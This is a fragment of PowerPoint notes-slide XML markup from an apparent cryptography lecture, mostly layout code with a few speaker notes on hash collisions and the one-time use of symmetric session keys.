            <p:ph type="sldNum" idx="27"/>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2A9654B4-088D-431C-B4E7-BFC652AF460C}"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7" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115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a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="420"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Some algorithms have issues with predictable collisions</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1159" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="28"/>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B2B055AB-6D9E-416F-AC04-557B8042A690}"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0" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1161"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62" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="29"/>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6B3326C1-5168-4A3A-B9E8-1097F553DB8B}"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3" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1164"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216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Session keys </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>- Symmetric key</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>- Used only once </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171360" indent="-171360">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buFont typeface="StarSymbol"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Provides more protection </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>If the key is used multiple times it can be intercepted or subject to cryptanalysis</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1165" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="30"/>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AC8A1FDF-8D70-401C-BB8E-4C347D450DA5}"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6" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1167"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68" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="31"/>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5C55B80A-5045-49C2-AF3E-19370698C051}"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9" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117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71" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="32"/>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9700EC30-568F-461D-85B1-F8D82CB26FB7}"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2" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1173"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74" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="33"/>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AU" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{320B49B5-4656-4E0B-9DD9-5A98050050D1}" type="slidenum">
              <a:rPr b="0" lang="en-AU"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5" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1176"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
        <p:nvSpPr>
          <p:cNvPr id="1177" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="34"/>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F4DCA3CC-F38A-4871-A84D-BD77A69AB553}"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8" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="35"/>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2EADC341-C652-4300-9998-B7DA9E2E9946}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1179" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1180" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>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1" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1182" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1183" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="36"/>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9D440ABC-299A-4D5C-A97D-00EE57F576B8}"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4" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1185" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1186" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="37"/>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A8F0416D-E076-4B9C-A270-1AA129F9D0F7}"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7" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1188" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1189" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="38"/>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1EB92409-0D7A-45A7-9F45-1BB902EA4D46}"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0" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1191" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1192" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="39"/>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62A0377D-2417-436C-8246-765DACCAC710}"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3" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1194" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1195" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="40"/>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21DE7704-9364-4461-8C01-9FFB89F20B84}"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6" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1197" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1198" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="41"/>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8BB1A56D-D109-42DE-8D57-7C1E74FA6BC9}"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notesSlides/notesSlide1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9" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1200" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1201" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="42"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4278960" y="10157400"/>
            <a:ext cx="3280320" cy="533880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{43F3B92E-5C32-4F84-B9F8-A00609AC7E8A}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="18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 name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="43430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7" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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9"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0"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85800" y="457200"/>
            <a:ext cx="7772040" cy="45921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4"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5"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6"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8"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9"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0" name="PlaceHolder 4"/>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2"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3"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4" name="PlaceHolder 4"/>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6" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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7" name="PlaceHolder 3"/>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9"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30"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31"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32" name="PlaceHolder 5"/>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4" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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35" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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36" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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37" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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38" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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39" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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4" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
